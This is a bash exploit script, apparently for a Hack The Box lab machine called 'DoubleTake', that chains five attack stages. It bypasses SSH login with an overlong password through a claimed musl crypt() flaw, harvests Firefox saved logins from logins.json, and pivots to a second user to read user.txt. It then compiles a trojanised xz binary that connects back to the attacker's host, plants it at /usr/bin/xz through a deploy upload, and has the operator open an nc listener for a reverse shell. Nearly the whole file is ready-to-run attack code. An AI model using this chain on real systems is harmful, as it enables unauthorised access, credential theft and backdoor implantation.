#!/usr/bin/env bash
# DoubleTake (HTB) — stages 1-5
# usage: ./pwn.sh <target-ip> <lhost> <lport>
set -uo pipefail

TARGET=${1:?usage: pwn.sh <target-ip> <lhost> <lport>}
LHOST=${2:?usage: pwn.sh <target-ip> <lhost> <lport>}
LPORT=${3:?usage: pwn.sh <target-ip> <lhost> <lport>}
HERE=$(cd "$(dirname "$0")" && pwd)

SSH_OPTS=(
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o ConnectTimeout=10
  -o PubkeyAuthentication=no
  -o PreferredAuthentications=password
  -o LogLevel=ERROR
)

# CVE-2026-123158: musl crypt() returns "*" for a 300-byte password,
# matching the locked `alpine` shadow entry.
PW=$(printf 'A%.0s' $(seq 1 300))

alpine() { sshpass -p "$PW" ssh "${SSH_OPTS[@]}" "alpine@$TARGET" "$@"; }

echo "[*] Stage 1: SSH auth bypass -> alpine"
OK=0
for i in 1 2 3; do
  if alpine id >/dev/null 2>&1; then
    OK=1; echo "[+] shell as alpine (attempt $i)"; break
  fi
  echo "[-] attempt $i denied (first prompt often fails — retrying)"
done
[[ $OK -eq 1 ]] || { echo "[!] bypass failed"; exit 1; }

echo "[*] Stage 2: harvesting Firefox saved logins"
LOGINS=$(alpine 'cat ~/.mozilla/firefox/*/logins.json')
APP_USER=$(printf '%s' "$LOGINS" | grep -o '"encryptedUsername":"[^"]*"' | cut -d'"' -f4 | base64 -d)
APP_PASS=$(printf '%s' "$LOGINS" | grep -o '"encryptedPassword":"[^"]*"' | cut -d'"' -f4 | base64 -d)
echo "[+] app creds: ${APP_USER}:${APP_PASS}"

echo "[*] Stage 3: user.txt via bob"
sshpass -p "$APP_PASS" ssh "${SSH_OPTS[@]}" "bob@$TARGET" 'cat ~/user.txt' | tee "$HERE/user.txt"

echo "[*] Stage 4: building static xz trojan"
gcc -static -O2 -DLHOST="\"$LHOST\"" -DLPORT="$LPORT" \
    -o "$HERE/xz" "$HERE/xz.c" || exit 1
rm -rf "$HERE/pkg" && mkdir -p "$HERE/pkg/usr/bin"
cp "$HERE/xz" "$HERE/pkg/usr/bin/xz"
( cd "$HERE/pkg" && tar cf "$HERE/plant.tar" usr/bin/xz )

echo "[*] Stage 5: planting trojan at /usr/bin/xz in container"
curl -s -u "$APP_USER:$APP_PASS" \
     -F "archive=@$HERE/plant.tar" -F 'workspace=/' \
     "http://$TARGET/deploy"
echo

cat <<EOF

[+] Planted. Now, in two terminals:
    A) nc -lvnp $LPORT
    B) ./trigger.sh $TARGET '$APP_USER' '$APP_PASS'
    (a 500 from /deploy is expected)
EOF
